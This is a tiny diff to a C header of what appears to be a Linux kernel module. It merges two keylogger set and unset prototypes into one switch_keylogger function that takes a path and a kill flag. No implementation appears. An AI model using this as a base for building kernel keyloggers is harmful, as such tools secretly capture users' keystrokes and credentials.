@@ -4,7 +4,6 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
 
-void set_keylogger ( void );
-void unset_keylogger ( void );
+int switch_keylogger( char * path, char kill );
 
 #endif
